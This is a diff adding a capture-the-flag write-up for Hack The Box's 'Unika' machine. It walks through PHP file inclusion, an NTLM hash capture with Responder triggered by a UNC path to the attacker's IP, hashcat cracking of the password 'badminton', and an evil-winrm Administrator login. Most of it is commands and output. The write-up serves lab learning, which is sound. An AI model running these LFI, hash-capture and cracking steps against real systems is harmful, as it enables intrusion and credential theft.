@@ -4,19 +4,364 @@
 |---------|------|----------|----------------|----------|
 | **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
 | **Crocodile** | 1 | FTP (21), HTTP (80) | 2026-03-26 | [↓ Jump to Crocodile](#htb-starting-point-crocodile-ftp--web) |
-| **Responder** | 1 | — | — | — |
+| **Responder** | 1 | HTTP (80) → WinRM (5985) | 2026-03-27 | [↓ Jump to Responder](#htb-starting-point-responder-lfi--hash-capture--winrm) |
 | **Three** | 1 | — | — | — |
 
 ---
 
-> **Tier 1 Progress:** 2/4 machines completed (50%)  
-> **Next:** Responder → Three  
-> **Last Updated:** March 26, 2026
+> **Tier 1 Progress:** 3/4 machines completed (75%)  
+> **Next:** Three  
+> **Last Updated:** March 27, 2026
 
 ---
 
-<!-- Your existing Crocodile write-up starts here -->
+# HTB Starting Point: Unika (LFI → Hash Capture → WinRM)
 
+| **Machine Info** | |
+|------------------|-|
+| **Name** | Unika |
+| **Difficulty** | Starting Point (Tier 1) |
+| **Services** | HTTP (80) → WinRM (5985) |
+| **Date Completed** | 2026-03-27 |
+
+---
+
+## 📋 Table of Contents
+1. [Reconnaissance](#-reconnaissance)
+2. [Local File Inclusion (LFI) Discovery](#-local-file-inclusion-lfi-discovery)
+3. [Remote File Inclusion (RFI) Test](#-remote-file-inclusion-rfi-test)
+4. [Hash Capture with Responder](#-hash-capture-with-responder)
+5. [Hash Cracking](#-hash-cracking)
+6. [Remote Access (WinRM)](#-remote-access-winrm)
+7. [Questions & Answers](#-questions--answers)
+8. [Quick Reference](#-quick-reference)
+9. [Troubleshooting](#-troubleshooting)
+10. [Lessons Learned](#-lessons-learned)
+
+---
+
+## 💻 Environment Setup
+
+To ensure reproducibility and consistent results, the following environment was used for this engagement:
+
+| **Component** | **Specification** |
+| :--- | :--- |
+| **Attack Machine** | Kali Linux (2024.x) |
+| **Connectivity** | OpenVPN (HTB Lab Configuration) |
+| **Tools Used** | Nmap, curl, Responder, hashcat, evil-winrm |
+
+> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.
+
+---
+
+## 🔍 Reconnaissance
+
+### Host Resolution
+```bash
+echo "10.129.58.173 unika.htb" | sudo tee -a /etc/hosts
+```
+
+### Port Scan
+```bash
+# Fast port scan to discover open ports
+nmap -p- --min-rate 1000 10.129.58.173
+```
+
+**Results:**
+```
+PORT   STATE SERVICE
+80/tcp open  http
+```
+
+### Service Version Detection with Nmap
+```bash
+# Run default scripts and version detection
+nmap -sC -sV -p 80 10.129.58.173
+```
+
+**Output:**
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: Unika
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+```
+
+**Interpretation:**
+| Field | Value |
+|-------|-------|
+| **Web Server** | Apache 2.4.52 (Win64) |
+| **PHP Version** | 8.1.1 |
+| **Environment** | XAMPP on Windows |
+| **Framework** | Custom PHP with session cookies |
+
+---
+
+## 🧩 Local File Inclusion (LFI) Discovery
+
+### Initial Parameter Testing
+
+The `page` parameter is used to load different language versions.
+
+```bash
+# Test the page parameter
+curl -v http://unika.htb/?page=home
+```
+
+**Error Revealed:**
+```
+Warning: include(home): Failed to open stream in C:\xampp\htdocs\index.php on line 11
+```
+
+This confirmed:
+- PHP `include()` is used with a user-controlled `page` parameter
+- The target is a Windows XAMPP environment
+- No input validation → LFI vulnerability
+
+### LFI Confirmation
+
+```bash
+# Attempt to read a known Windows file
+curl "http://unika.htb/?page=../../../../windows/win.ini"
+```
+
+**Output:**
+```
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+```
+
+✅ Successfully read Windows system file → LFI confirmed.
+
+### Source Code Disclosure
+
+```bash
+# Read index.php using PHP filters (base64 encoded)
+curl "http://unika.htb/?page=php://filter/convert.base64-encode/resource=index.php"
+```
+
+**Decoded Source Code (Key Section):**
+```php
+<?php
+$domain = "unika.htb";
+if($_SERVER['SERVER_NAME'] != $domain) {
+  echo '<meta http-equiv="refresh" content="0;url=http://unika.htb/">';
+  die();
+}
+if(!isset($_GET['page'])) {
+  include("./english.html");
+}
+else {
+  include($_GET['page']);   # ← LFI vulnerability
+}
+```
+
+---
+
+## 📡 Remote File Inclusion (RFI) Test
+
+### RFI Attempt
+
+```bash
+# Attempt to include a file from the attacker's machine
+curl "http://unika.htb/?page=http://10.10.14.87/test.php"
+```
+
+**Error Response:**
+```
+Warning: include(): http:// wrapper is disabled by allow_url_include=0
+```
+
+✅ RFI is disabled, but the attempt revealed that the server attempts to authenticate via SMB when given a UNC path (`//`).
+
+---
+
+## 🎣 Hash Capture with Responder
+
+### Start Responder (Attacker Machine)
+
+```bash
+# Start Responder on the VPN interface to listen for NTLM hashes
+sudo responder -I tun0 -w -F -v
+```
+
+### Trigger NTLM Authentication
+
+The target will attempt to authenticate to the attacker's machine when it tries to access a UNC path (`//`).
+
+```bash
+# Trigger the target to send an NTLM hash to the attacker
+curl "http://unika.htb/?page=//10.10.14.87/test"
+```
+
+### Hash Captured in Responder
+
+```
+[SMB] NTLMv2-SSP Client   : 10.129.58.173
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:b2a572a47cc6a77c:...
+```
+
+---
+
+## 🔓 Hash Cracking
+
+### Save Hash to File
+
+```bash
+# Save the captured NTLMv2 hash to a file
+echo 'Administrator::RESPONDER:b2a572a47cc6a77c:...' > hash.txt
+```
+
+### Crack with hashcat
+
+```bash
+# Crack the NTLMv2 hash using rockyou.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+**Cracked Password:**
+```
+badminton
+```
+
+---
+
+## 💻 Remote Access (WinRM)
+
+### Connect with Evil-WinRM
+
+```bash
+# Connect to the target using the cracked credentials
+evil-winrm -i 10.129.58.173 -u Administrator -p badminton
+```
+
+✅ Successful connection established.
+
+### Flag Locations
+
+- **User flag:** `C:\Users\mike\Desktop\flag.txt`
+- **Root flag:** `C:\Users\Administrator\Desktop\root.txt`
+
+### Retrieve Flags
+
+```powershell
+type "C:\Users\mike\Desktop\flag.txt"
+type "C:\Users\Administrator\Desktop\root.txt"
+```
+
+---
+
+## 📝 Questions & Answers
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | What is the name of the URL parameter used to load different language versions? | `page` |
+| 2 | Which parameter value exploits LFI? | `../../../../windows/win.ini` |
+| 3 | Which parameter value exploits RFI? | `//10.10.14.6/somefile` |
+| 4 | What flag do we use in Responder to specify the network interface? | `-I` |
+| 5 | What port does WinRM listen on? | `5985` |
+| 6 | What password did we crack for Administrator? | `badminton` |
+
+---
+
+## ⚡ Quick Reference
+
+### Host Configuration
+```bash
+# Add domain to hosts file
+echo "10.129.58.173 unika.htb" | sudo tee -a /etc/hosts
+```
+
+### LFI Testing
+```bash
+# Basic LFI test
+curl "http://unika.htb/?page=../../../../windows/win.ini"
+
+# Read source code (base64 encoded)
+curl "http://unika.htb/?page=php://filter/convert.base64-encode/resource=index.php"
+```
+
+### Responder
+```bash
+# Start responder on VPN interface
+sudo responder -I tun0 -w -F -v
+
+# Trigger NTLM authentication
+curl "http://unika.htb/?page=//10.10.14.87/test"
+```
+
+### Hash Cracking
+```bash
+# Crack NetNTLMv2 hash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+### Remote Access
+```bash
+# Connect via WinRM
+evil-winrm -i 10.129.58.173 -u Administrator -p badminton
+```
+
+---
+
+## 🐛 Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| Could not resolve host: unika.htb | Add entry to `/etc/hosts` |
+| RFI not working | Check `allow_url_include=0` in PHP config — use LFI instead |
+| Responder not capturing | Verify interface with `ip a`, use `-I tun0` |
+| hashcat: rockyou.txt not found | Decompress with `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
+| WinRM connection fails | Verify service is running: `nmap -p 5985 10.129.58.173` |
+
+---
+
+## 💡 Lessons Learned
+
+| # | Lesson |
+|---|--------|
+| 1 | **LFI is powerful** — Even without RFI, LFI can lead to source code disclosure and further exploitation. |
+| 2 | **UNC paths trigger NTLM** — Windows servers automatically attempt NTLM authentication when accessing UNC paths like `//attacker_ip/share`. |
+| 3 | **Responder captures hashes** — Use Responder to capture NTLM hashes when targets connect to your machine. |
+| 4 | **rockyou.txt is essential** — A good wordlist cracks most common passwords. |
+| 5 | **WinRM is a common foothold** — Port 5985 is often open and provides a reliable shell with valid credentials. |
+| 6 | **Default credentials are not always the answer** — We had to discover the password by cracking the hash. |
+
+---
+
+## 🔗 Resources
+
+- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm) — Remote shell via WinRM
+- [Responder GitHub](https://github.com/lgandx/Responder) — LLMNR/NBT-NS/MDNS poisoner
+- [Hashcat](https://hashcat.net/hashcat/) — Password recovery tool
+- [XAMPP](https://www.apachefriends.org/) — Windows web server stack used by target
+
+---
+
+## 🏷️ Tags
+
+`#htb` `#starting-point` `#unika` `#lfi` `#responder` `#ntlm` `#hashcat` `#winrm` `#evil-winrm`
+
+---
+
+<div align="center">
+  
+**Machine Completed** ✅
+
+*Last Updated: March 27, 2026*
+
+</div>
+
+---
 
 # HTB Starting Point: Crocodile (FTP + Web)
 
